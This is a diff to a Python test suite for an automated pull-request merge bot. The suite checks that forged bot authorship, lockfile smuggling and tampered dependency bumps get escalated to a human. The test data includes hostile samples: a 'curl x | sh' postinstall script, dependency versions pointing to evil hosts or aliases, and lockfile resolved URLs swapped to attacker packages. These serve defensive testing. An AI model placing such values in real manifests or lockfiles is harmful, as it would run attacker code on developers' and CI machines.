@@ -54,14 +54,44 @@ def pkg_patch(old="15.1.2", new="15.1.4", name="next"):
     return f'@@ -10,3 +10,3 @@\n   "dependencies": {{\n-    "{name}": "^{old}",\n+    "{name}": "^{new}",\n     "react": "19.0.0"'
 
 
-LOCK = ('@@ -1,4 +1,4 @@\n-    "node_modules/next": {\n-      "resolved": "https://registry.npmjs.org/next/-/next-15.1.2.tgz",\n'
-        '+    "node_modules/next": {\n+      "resolved": "https://registry.npmjs.org/next/-/next-15.1.4.tgz",')
 DEPENDABOT = {"login": "dependabot[bot]", "type": "Bot"}
-BOT_COMMITS = [{"sha": "c" * 40, "author": DEPENDABOT, "verified": True}]
+WEB_FLOW = {"login": "web-flow", "type": "User"}
+BOT_COMMITS = [{"sha": "c" * 40, "author": DEPENDABOT, "committer": WEB_FLOW, "verified": True}]
+PKG = {"name": "web", "version": "1.0.0", "scripts": {"build": "next build", "postinstall": "1.0.0"},
+       "dependencies": {"next": "^15.1.2", "react": "19.0.0"}}
+LOCKDOC = {"name": "web", "lockfileVersion": 3, "requires": True, "packages": {
+    "": {"name": "web", "dependencies": {"next": "^15.1.2", "react": "19.0.0"}},
+    "node_modules/next": {"version": "15.1.2", "resolved": "https://registry.npmjs.org/next/-/next-15.1.2.tgz", "integrity": "sha512-old"},
+    "node_modules/react": {"version": "19.0.0", "resolved": "https://registry.npmjs.org/react/-/react-19.0.0.tgz", "integrity": "sha512-r"}}}
 
 
-def dep(files, title="Bump next from 15.1.2 to 15.1.4", author=DEPENDABOT, commits=BOT_COMMITS, policy=TEMPLATE):
-    return tier(files, policy=policy, title=title, author=author, commits=commits)
+def pkg_file(mutate=None, new="^15.1.4", path="package.json"):
+    head = json.loads(json.dumps(PKG))
+    head["dependencies"]["next"] = new
+    if mutate:
+        mutate(head)
+    entry = f(path, pkg_patch())
+    entry.update(base_text=json.dumps(PKG, indent=2), head_text=json.dumps(head, indent=2))
+    return entry
+
+
+def lock_file(mutate=None, version="15.1.4"):
+    head = json.loads(json.dumps(LOCKDOC))
+    head["packages"][""]["dependencies"]["next"] = f"^{version}"
+    head["packages"]["node_modules/next"].update(
+        version=version, resolved=f"https://registry.npmjs.org/next/-/next-{version}.tgz", integrity="sha512-new")
+    if mutate:
+        mutate(head)
+    entry = f("package-lock.json", "@@\n-x\n+y")
+    entry.update(base_text=json.dumps(LOCKDOC), head_text=json.dumps(head))
+    return entry
+
+
+def dep(files, title="Bump next from 15.1.2 to 15.1.4", author=DEPENDABOT, commits=BOT_COMMITS, policy=TEMPLATE,
+        actors=(), total=None):
+    return tier(files, policy=policy, title=title, author=author, commits=commits,
+                total_commits=len(commits) if total is None else total,
+                head_ref_actors=None if actors is None else list(actors))
 
 
 class PolicyTests(unittest.TestCase):
@@ -170,6 +200,24 @@ class PathBypassTests(unittest.TestCase):
             with self.subTest(path=path):
                 self.assertEqual("human", tier([f(path)], policy=PERMISSIVE))
 
+    def test_only_plain_text_can_be_auto(self) -> None:
+        # Round 2 #5: docs/ci.ps1 was auto via docs/**; MDX/SVG/HTML execute.
+        for path in ("content/post.mdx", "public/images/logo.svg", "docs/page.html", "docs/ci.ps1",
+                     "docs/conf.py", "tests/test_x.py", "docs/data.json"):
+            with self.subTest(path=path):
+                self.assertEqual("review", tier([f(path)], policy=PERMISSIVE))
+
+    def test_build_and_deploy_entry_points_are_human(self) -> None:
+        for path in ("setup.py", "pkg/setup.cfg", "wrangler.jsonc", "renovate.json5", ".renovaterc",
+                     "docs/Makefile", "Dockerfile.prod", "docker-compose.yml", ".nvmrc", "vercel.json"):
+            with self.subTest(path=path):
+                self.assertEqual("human", tier([f(path)], policy=PERMISSIVE))
+
+    def test_agent_instructions_in_template_are_human(self) -> None:
+        for path in ("skills/x/SKILL.md", "prompts/a.md", "agents/reviewer.md", "commands/ship.md"):
+            with self.subTest(path=path):
+                self.assertEqual("human", tier([f(path)]))
+
     def test_docs_only_is_auto(self) -> None:
         self.assertEqual("auto", tier([f("docs/guide.md"), f("README.md")]))
 
@@ -223,69 +271,111 @@ class SnapshotIntegrityTests(unittest.TestCase):
 
 class DependencyTests(unittest.TestCase):
     def test_verified_dependabot_patch_bump_is_auto(self) -> None:
-        self.assertEqual("auto", dep([f("package.json", pkg_patch()), f("package-lock.json", LOCK)]))
+        self.assertEqual("auto", dep([pkg_file(), lock_file()]))
 
     def test_major_bump_is_review(self) -> None:
-        self.assertEqual("review", dep([f("package.json", pkg_patch("18.3.1", "19.0.0"))], title="Bump next from 18.3.1 to 19.0.0"))
+        self.assertEqual("review", dep([pkg_file(new="^16.0.0"), lock_file(version="16.0.0")], title="Bump next from 15.1.2 to 16.0.0"))
 
     def test_dependency_bumps_human_keeps_major_human(self) -> None:
-        # Audit: `dependency_bumps: human` was downgraded to review for majors.
+        # Round 1: `dependency_bumps: human` was downgraded to review for majors.
         policy = TEMPLATE.replace("dependency_bumps: auto", "dependency_bumps: human")
-        self.assertEqual("human", dep([f("package.json", pkg_patch("18.3.1", "19.0.0"))], title="Bump next from 18.3.1 to 19.0.0", policy=policy))
-        self.assertEqual("human", dep([f("package.json", pkg_patch())], policy=policy))
+        self.assertEqual("human", dep([pkg_file(new="^16.0.0")], title="Bump next from 15.1.2 to 16.0.0", policy=policy))
+        self.assertEqual("human", dep([pkg_file()], policy=policy))
 
     def test_spoofed_title_by_non_bot_author(self) -> None:
-        human_author = {"login": "someone", "type": "User"}
-        commits = [{"sha": "c" * 40, "author": human_author, "verified": True}]
-        self.assertEqual("human", dep([f("package.json", pkg_patch())], author=human_author, commits=commits))
+        user = {"login": "someone", "type": "User"}
+        commits = [{"sha": "c" * 40, "author": user, "committer": WEB_FLOW, "verified": True}]
+        self.assertEqual("human", dep([pkg_file()], author=user, commits=commits))
+        self.assertEqual("human", dep([pkg_file()], author={"login": "dependabot[bot]", "type": "User"}))
 
-    def test_user_account_named_like_the_bot(self) -> None:
-        fake = {"login": "dependabot[bot]", "type": "User"}
-        self.assertEqual("human", dep([f("package.json", pkg_patch())], author=fake))
+    def test_forged_bot_author_signed_by_someone_else(self) -> None:
+        # Round 2 #1: personally signed commit claiming Dependabot as author.
+        forged = [{"sha": "c" * 40, "author": DEPENDABOT, "committer": {"login": "attacker", "type": "User"}, "verified": True}]
+        self.assertEqual("human", dep([pkg_file()], commits=forged))
+        self.assertEqual("human", dep([pkg_file()], commits=[{**BOT_COMMITS[0], "verified": False}]))
 
-    def test_unverified_or_foreign_commit(self) -> None:
-        self.assertEqual("human", dep([f("package.json", pkg_patch())], commits=[{"sha": "c" * 40, "author": DEPENDABOT, "verified": False}]))
-        pushed = BOT_COMMITS + [{"sha": "d" * 40, "author": {"login": "frankxai", "type": "User"}, "verified": True}]
-        self.assertEqual("human", dep([f("package.json", pkg_patch())], commits=pushed))
+    def test_extra_commit_or_rewritten_branch(self) -> None:
+        second = {"sha": "d" * 40, "author": DEPENDABOT, "committer": WEB_FLOW, "verified": True}
+        self.assertEqual("human", dep([pkg_file()], commits=BOT_COMMITS + [second]))
+        self.assertEqual("human", dep([pkg_file()], total=2))
+        # a branch writer force-pushed a web-flow commit with a forged author
+        self.assertEqual("human", dep([pkg_file()], actors=["attacker"]))
+        self.assertEqual("human", dep([pkg_file()], actors=None))
+        self.assertEqual("auto", dep([pkg_file(), lock_file()], actors=["dependabot"]))
 
-    def test_postinstall_or_new_dependency_in_manifest(self) -> None:
-        postinstall = pkg_patch() + '\n+    "postinstall": "curl https://x.sh | sh",'
-        self.assertEqual("human", dep([f("package.json", postinstall)]))
-        new_dep = '@@\n+    "left-pad": "^1.3.0",'
-        self.assertEqual("human", dep([f("package.json", new_dep)]))
+    def test_postinstall_added_or_script_version_bumped(self) -> None:
+        self.assertEqual("human", dep([pkg_file(lambda h: h["scripts"].update(postinstall="curl x | sh"))]))
+        # Round 2 #11: a version-shaped script value is not a dependency.
+        def script_bump(h):
+            h["dependencies"]["next"] = "^15.1.2"
+            h["scripts"]["postinstall"] = "1.0.1"
+        self.assertEqual("human", dep([pkg_file(script_bump, new="^15.1.2")], title="Bump postinstall from 1.0.0 to 1.0.1"))
 
-    def test_manifest_version_that_is_a_url_or_alias(self) -> None:
-        for new in ("git+https://evil/next.git", "npm:evil@1.0.0", "file:../next"):
+    def test_new_dependency_or_url_version(self) -> None:
+        self.assertEqual("human", dep([pkg_file(lambda h: h["dependencies"].update({"left-pad": "^1.3.0"}))]))
+        for new in ("git+https://evil/next.git", "npm:evil@1.0.0", "file:../next", "https://evil/next.tgz"):
             with self.subTest(new=new):
-                patch = f'@@\n-    "next": "^15.1.2",\n+    "next": "{new}",'
-                self.assertEqual("human", dep([f("package.json", patch)]))
+                self.assertEqual("human", dep([pkg_file(new=new)]))
 
-    def test_lockfile_redirects(self) -> None:
-        for line in ('+      "resolved": "https://evil.example/next-15.1.4.tgz",',
-                     '+      "resolved": "git+ssh://git@github.com/evil/next.git",',
-                     "+  tarball: https://registry.npmjs.org/next.tgz"):
-            with self.subTest(line=line):
-                self.assertEqual("human", dep([f("package.json", pkg_patch()), f("package-lock.json", "@@\n" + line)]))
+    def test_lockfile_smuggling(self) -> None:
+        # Round 2 #2: another package swapped for an attacker package on the real registry.
+        swap = lambda h: h["packages"]["node_modules/react"].update(resolved="https://registry.npmjs.org/evil/-/evil-1.0.0.tgz")
+        self.assertEqual("human", dep([pkg_file(), lock_file(swap)]))
+        added = lambda h: h["packages"].update({"node_modules/evil": {"version": "1.0.0"}})
+        self.assertEqual("human", dep([pkg_file(), lock_file(added)]))
+        wrong_tarball = lambda h: h["packages"]["node_modules/next"].update(resolved="https://registry.npmjs.org/evil/-/next-15.1.4.tgz")
+        self.assertEqual("human", dep([pkg_file(), lock_file(wrong_tarball)]))
+        other_host = lambda h: h["packages"]["node_modules/next"].update(resolved="https://evil.example/next-15.1.4.tgz")
+        self.assertEqual("human", dep([pkg_file(), lock_file(other_host)]))
+        bin_added = lambda h: h["packages"]["node_modules/next"].update(bin={"next": "evil.js"})
+        self.assertEqual("human", dep([pkg_file(), lock_file(bin_added)]))
 
-    def test_lockfile_with_unavailable_patch(self) -> None:
-        self.assertEqual("human", dep([f("package.json", pkg_patch()), f("pnpm-lock.yaml", None)]))
+    def test_lockfile_content_unavailable_or_alone(self) -> None:
+        lock = lock_file()
+        lock["head_text"] = None
+        self.assertEqual("human", dep([pkg_file(), lock]))
+        self.assertEqual("human", dep([lock_file()]))
 
-    def test_lockfile_only_grouped_mismatch(self) -> None:
-        self.assertEqual("human", dep([f("package-lock.json", LOCK)]))
-        self.assertEqual("human", dep([f("package.json", pkg_patch())], title="Bump the npm_and_yarn group with 3 updates"))
-        self.assertEqual("human", dep([f("package.json", pkg_patch())], title="Bump react from 15.1.2 to 15.1.4"))
-
-    def test_manifest_with_code_or_without_bump_title(self) -> None:
-        self.assertEqual("human", dep([f("package.json", pkg_patch()), f("app/page.tsx")]))
-        self.assertEqual("human", tier([f("pnpm-lock.yaml", LOCK)], title="chore: refresh lockfile"))
-
-    def test_renovate_and_python_and_go(self) -> None:
+    def test_policy_human_glob_applies_to_dependency_files(self) -> None:
+        # Round 2 #3: supabase/** is human in the arcanea policy.
+        policy = TEMPLATE.replace('  - "contracts/**"\n', '  - "contracts/**"\n  - "supabase/**"\n')
         renovate = {"login": "renovate[bot]", "type": "Bot"}
-        commits = [{"sha": "c" * 40, "author": renovate, "verified": True}]
+        commits = [{"sha": "c" * 40, "author": renovate, "committer": WEB_FLOW, "verified": True}]
+        entry = f("supabase/requirements.txt", "@@\n-httpx==0.27.0\n+httpx==0.27.2")
+        self.assertEqual("human", dep([entry], title="Update dependency httpx to v0.27.2", author=renovate, commits=commits, policy=policy))
+
+    def test_renamed_manifest_is_human(self) -> None:
+        # Round 2 #4: package.json renamed away looked like a docs change.
+        entry = f("docs/dependencies.txt", "@@\n-a\n+b", status="renamed", prev="package.json")
+        self.assertEqual("human", tier([entry]))
+        self.assertEqual("human", dep([{**pkg_file(), "status": "renamed", "previous_filename": "web/package.json"}]))
+
+    def test_grouped_mismatch_and_mixed(self) -> None:
+        self.assertEqual("human", dep([pkg_file()], title="Bump the npm_and_yarn group with 3 updates"))
+        self.assertEqual("human", dep([pkg_file()], title="Bump react from 15.1.2 to 15.1.4"))
+        self.assertEqual("human", dep([pkg_file(), f("app/page.tsx")]))
+        self.assertEqual("human", tier([f("pnpm-lock.yaml", "@@\n-a\n+b")], title="chore: refresh lockfile"))
+
+    def test_line_lockfiles_are_at_most_review(self) -> None:
+        pnpm = f("pnpm-lock.yaml", "@@ -10,6 +10,6 @@ importers:\n       next:\n-        specifier: ^15.1.2\n"
+                 "-        version: 15.1.2\n+        specifier: ^15.1.4\n+        version: 15.1.4\n"
+                 "@@ -40,3 +40,3 @@ packages:\n-  next@15.1.2:\n-    resolution: {integrity: sha512-aaa}\n"
+                 "+  next@15.1.4:\n+    resolution: {integrity: sha512-bbb}")
+        self.assertEqual("review", dep([pkg_file(), pnpm]))
+        transitive = f("pnpm-lock.yaml", "@@ -90,3 +90,3 @@ packages:\n-  evil@1.0.0:\n+  evil@1.0.1:")
+        self.assertEqual("human", dep([pkg_file(), transitive]))
+        escaped = f("pnpm-lock.yaml", "@@ -1 +1 @@ next\n-  next@15.1.2:\n+  next@15.1.4: \\u002f")
+        self.assertEqual("human", dep([pkg_file(), escaped]))
+
+    def test_renovate_requirements_and_go(self) -> None:
+        renovate = {"login": "renovate[bot]", "type": "Bot"}
+        commits = [{"sha": "c" * 40, "author": renovate, "committer": WEB_FLOW, "verified": True}]
         self.assertEqual("auto", dep([f("requirements.txt", "@@\n-httpx==0.27.0\n+httpx==0.27.2")],
                                      title="Update dependency httpx to v0.27.2", author=renovate, commits=commits))
         self.assertEqual("auto", dep([f("go.mod", "@@\n-\tgithub.com/x/y v1.2.3\n+\tgithub.com/x/y v1.2.4")],
                                      title="Bump github.com/x/y from 1.2.3 to 1.2.4"))
+        self.assertEqual("human", dep([f("pyproject.toml", '@@\n-httpx = "0.27.0"\n+httpx = "0.27.2"')],
+                                      title="Bump httpx from 0.27.0 to 0.27.2"))
 
 
 class VerdictTests(unittest.TestCase):
@@ -384,15 +474,17 @@ class FakeGitHub:
             "files": [f("docs/a.md")], "author": {"login": "frankx-builder[bot]", "type": "Bot"},
             "reviews": [], "comments": [], "stop": [], "incidents": [], "merged_nodes": [],
             "merge_status": 200, "checks": "success", "hub_issues": [], "auto_merge": None,
+            "branch_commits": [{"sha": "m" * 40}],
         }
         self.state.update(state)
         self.calls: list[tuple] = []
         self.gh = GitHub("t", transport=self.transport)
 
     def pr(self, head):
+        labels = [{"name": n} for n in self.state.get("labels_now", [])]
         return {"number": 5, "title": "docs: tweak", "draft": False, "state": "open", "node_id": "PR_5",
                 "head": {"sha": head, "repo": {"full_name": REPO}}, "base": {"sha": BASE, "ref": "main"},
-                "user": self.state["author"], "labels": [], "created_at": "2026-09-29T00:00:00Z",
+                "user": self.state["author"], "labels": labels, "created_at": "2026-09-29T00:00:00Z",
                 "html_url": "u", "auto_merge": self.state["auto_merge"]}
 
     def transport(self, method, url, headers, body):
@@ -412,6 +504,8 @@ class FakeGitHub:
                 return ok({"data": {"repository": {"object": s["commit_node"]}}})
             return ok({"data": {"repository": {"pullRequests": {"pageInfo": {"hasNextPage": False, "endCursor": None},
                                                                 "nodes": s["merged_nodes"]}}}})
+        if path.startswith(f"repos/{HUB_REPO}/compare/"):
+            return ok(s.get("hub_compare", {"status": "identical", "files": []}))
         if path.startswith(f"repos/{HUB_REPO}/issues"):
             if method == "POST":
                 s["hub_issues_created"] = s.get("hub_issues_created", []) + [(path, data)]
@@ -425,16 +519,23 @@ class FakeGitHub:
             return ok({"default_branch": "main"})
         if path.startswith(f"repos/{REPO}/pulls?state=open"):
             return ok([self.pr(s["head_now"][0])])
+        if path.startswith(f"repos/{REPO}/pulls?state=closed"):
+            return ok([])
+        if path.startswith(f"repos/{REPO}/commits?sha="):
+            return ok(s["branch_commits"])
         if path == f"repos/{REPO}/pulls/5":
             head = s["head_now"].pop(0) if len(s["head_now"]) > 1 else s["head_now"][0]
             return ok(self.pr(head))
         if path.startswith(f"repos/{REPO}/pulls/5/reviews") and method == "GET":
             return ok(s["reviews"])
         if path == f"repos/{REPO}/pulls/5/reviews" and method == "POST":
+            s["reviews"] = s["reviews"] + [{"id": 99, "state": "APPROVED", "user": {"login": STEWARD, "type": "Bot"}}]
             return ok({"id": 99})
         if "/dismissals" in path:
             return ok({})
         if path == f"repos/{REPO}/pulls/5/merge":
+            if s["merge_status"] == "timeout":
+                raise TimeoutError("read timed out")
             return ok({"merged": True}) if s["merge_status"] == 200 else ok({"message": "Head branch was modified"}, s["merge_status"])
         if path.startswith(f"repos/{REPO}/issues/5/comments"):
             return ok(s["comments"] if method == "GET" else {"id": 7})
@@ -471,12 +572,12 @@ class FakeGitHub:
                 if m != "GET" and not (p == "graphql" and not d["query"].lstrip().startswith("mutation"))]
 
 
-def steward(fake: FakeGitHub, mode="live", target_mode="live", kill="", reviewer=None) -> Steward:
+def steward(fake: FakeGitHub, mode="live", target_mode="live", kill="", reviewer=None, run_attempt="1") -> Steward:
     config = {"targets": [{"repo": REPO, "mode": target_mode, "policy": None}], "global_daily_cap": 20,
               "max_merges_per_run": 3, "max_reviews_per_run": 8, "max_prs_per_run": 60}
     return Steward(fake.gh, fake.gh, config, {REPO: TEMPLATE}, mode=mode, kill_var=kill, steward_login=STEWARD,
                    hub_sha="f" * 40, reviewer=reviewer or (lambda role, system, content: dict(APPROVE)), now=NOW,
-                   log=lambda *_: None)
+                   log=lambda *_: None, run_attempt=run_attempt)
 
 
 class OrchestrationTests(unittest.TestCase):
@@ -566,7 +667,8 @@ class OrchestrationTests(unittest.TestCase):
             comments = []
             if attempt:
                 comments = [{"id": 1, "user": {"login": STEWARD, "type": "Bot"},
-                             "body": f"<!-- merge-steward head={H} tier=auto action=hold mode=live checks=success "
+                             "body": f"<!-- merge-steward head={H} tier=auto action=hold mode=live "
+                                     f"rules={steward(FakeGitHub()).rules[REPO]} checks=success "
                                      f"labels={labels_key([])} tries={attempt} final=0 -->"}]
             fake = FakeGitHub(comments=comments)
             steward(fake, reviewer=lambda *_: dict(INVALID)).run()
@@ -595,11 +697,11 @@ class OrchestrationTests(unittest.TestCase):
 
     def test_own_final_marker_skips_reevaluation(self) -> None:
         mine = {"id": 1, "user": {"login": STEWARD, "type": "Bot"},
-                "body": f"<!-- merge-steward head={H} tier=review action=hold mode=live checks=success "
-                        f"labels={labels_key([])} final=1 -->"}
+                "body": f"<!-- merge-steward head={H} tier=review action=hold mode=live rules={steward(FakeGitHub()).rules[REPO]} "
+                        f"checks=success labels={labels_key([])} final=1 -->"}
         fake = FakeGitHub(comments=[mine])
         self.assertEqual("unchanged", steward(fake).run()[0]["action"])
-        self.assertFalse(any("/compare/" in p for _, p, _ in fake.calls))
+        self.assertFalse(any(p.startswith(f"repos/{REPO}/compare/") for _, p, _ in fake.calls))
 
     def test_digest_found_by_marker_and_author_not_title(self) -> None:
         spoof = {"number": 11, "title": "Merge Steward digest", "body": "hi", "user": {"login": "attacker"}}
@@ -609,21 +711,89 @@ class OrchestrationTests(unittest.TestCase):
         created = fake.state["hub_issues_created"]
         self.assertEqual(f"repos/{HUB_REPO}/issues/12/comments", created[0][0])
 
-    def test_revert_guard_attributes_by_merger_not_labels(self) -> None:
+    def _guard(self, merger_by_commit: dict, states: list[str]):
         from unittest import mock
-        for merger, expected in (({"__typename": "Bot", "login": "frankx-steward"}, True),
-                                 ({"__typename": "User", "login": "frankxai"}, False)):
-            with self.subTest(merger=merger):
-                node = {"parents": {"nodes": [{"oid": "p" * 40}]}, "associatedPullRequests": {"nodes": [
-                    {"number": 4, "merged": True, "mergedBy": merger, "mergeCommit": {"oid": H}}]}}
-                fake = FakeGitHub(commit_node=node)
-                # main tip red, its parent green
-                with mock.patch("scripts.merge_steward.checks_state", side_effect=["failure", "success"]):
-                    steward(fake).revert_guard({"repo": REPO, "mode": "live"}, "main")
-                incident = [d for _, d in fake.state.get("hub_issues_created", []) if d.get("labels") == ["steward:incident"]]
-                self.assertEqual(expected, bool(incident))
-                if expected:
-                    self.assertIn("revert-url", incident[0]["body"])
+        commits = [{"sha": sha} for sha in merger_by_commit]
+        nodes = {sha: {"parents": {"nodes": [{"oid": "x"}]}, "associatedPullRequests": {"nodes": (
+                     [{"number": i, "merged": True, "mergedBy": m, "mergeCommit": {"oid": sha}}] if m else [])}}
+                 for i, (sha, m) in enumerate(merger_by_commit.items())}
+        fake = FakeGitHub(branch_commits=commits)
+        original = fake.transport
+
+        def transport(method, url, headers, body):
+            data = json.loads(body) if body else {}
+            if url.endswith("/graphql") and "associatedPullRequests" in data.get("query", ""):
+                return 200, {}, json.dumps({"data": {"repository": {"object": nodes[data["variables"]["oid"]]}}}).encode()
+            return original(method, url, headers, body)
+        fake.gh.transport = transport
+        with mock.patch("scripts.merge_steward.checks_state", side_effect=states):
+            steward(fake).revert_guard({"repo": REPO, "mode": "live"}, "main")
+        return [d for _, d in fake.state.get("hub_issues_created", []) if d.get("labels") == ["steward:incident"]]
+
+    def test_revert_guard_attributes_by_merger_not_labels(self) -> None:
+        bot, human = {"__typename": "Bot", "login": "frankx-steward"}, {"__typename": "User", "login": "frankxai"}
+        incident = self._guard({H: bot, "p" * 40: None}, ["failure", "success"])
+        self.assertEqual(1, len(incident))
+        self.assertIn("revert-url", incident[0]["body"])
+        self.assertEqual([], self._guard({H: human, "p" * 40: None}, ["failure", "success"]))
+
+    def test_red_spanning_two_steward_merges_still_opens_incident(self) -> None:
+        # Audit: merge A then B before A's CI finishes; both red. B's parent is red.
+        bot = {"__typename": "Bot", "login": "frankx-steward"}
+        incident = self._guard({"b" * 40: bot, "a" * 40: bot, "g" * 40: None}, ["failure", "failure", "success"])
+        self.assertEqual(1, len(incident))
+        self.assertIn("revert by hand", incident[0]["body"])
+
+    def test_reruns_and_superseded_code_do_nothing(self) -> None:
+        fake = FakeGitHub()
+        self.assertEqual([], steward(fake, run_attempt="2").run())
+        fake = FakeGitHub(hub_compare={"status": "ahead", "files": [{"filename": "merge-steward/targets.yml"}]})
+        self.assertEqual([], steward(fake).run())
+        fake = FakeGitHub(hub_compare={"status": "diverged", "files": []})
+        self.assertEqual([], steward(fake).run())
+        for fk in (fake,):
+            self.assertFalse(any(m != "GET" for m, p, _ in fk.calls if not p.startswith(f"repos/{HUB_REPO}")))
+        fake = FakeGitHub(hub_compare={"status": "ahead", "files": [{"filename": "fleet/bus/heartbeat.json"}]})
+        self.assertEqual("merge", steward(fake).run()[0]["action"])
+
+    def test_label_added_during_review_blocks_merge(self) -> None:
+        fake = FakeGitHub()
+        def reviewer(*_):
+            fake.state["labels_now"] = ["steward:human"]  # a person intervenes mid-review
+            return dict(APPROVE)
+        self.assertEqual("hold", steward(fake, reviewer=reviewer).run()[0]["action"])
+        self.assertFalse(any(p.endswith("/pulls/5/reviews") and m == "POST" for m, p, _ in fake.calls))
+
+    def test_checks_turning_red_during_review_blocks_merge(self) -> None:
+        fake = FakeGitHub()
+        def reviewer(*_):
+            fake.state["checks"] = "failure"
+            return dict(APPROVE)
+        self.assertEqual("hold", steward(fake, reviewer=reviewer).run()[0]["action"])
+        self.assertFalse(any(p.endswith("/merge") for _, p, _ in fake.calls))
+
+    def test_transport_timeout_after_approval_withdraws_it(self) -> None:
+        mine = {"id": 99, "state": "APPROVED", "user": {"login": STEWARD, "type": "Bot"}}
+        fake = FakeGitHub(merge_status="timeout")
+        original = fake.transport
+
+        def transport(method, url, headers, body):
+            if method == "POST" and url.endswith("/pulls/5/reviews"):
+                fake.state["reviews"] = [mine]  # the approval landed
+            return original(method, url, headers, body)
+        fake.gh.transport = transport
+        with self.assertRaises(TimeoutError):
+            steward(fake).run()
+        self.assertTrue(any(m == "PUT" and p.endswith("/reviews/99/dismissals") for m, p, _ in fake.calls))
+
+    def test_policy_change_invalidates_cached_verdict(self) -> None:
+        st = steward(FakeGitHub())
+        mine = {"id": 1, "user": {"login": STEWARD, "type": "Bot"},
+                "body": f"<!-- merge-steward head={H} tier=auto action=hold mode=live rules=old checks=success "
+                        f"labels={labels_key([])} tries=0 final=1 -->"}
+        fake = FakeGitHub(comments=[mine])
+        self.assertNotEqual("unchanged", steward(fake).run()[0]["action"])
+        self.assertNotEqual("old", st.rules[REPO])
 
 if __name__ == "__main__":
     unittest.main()
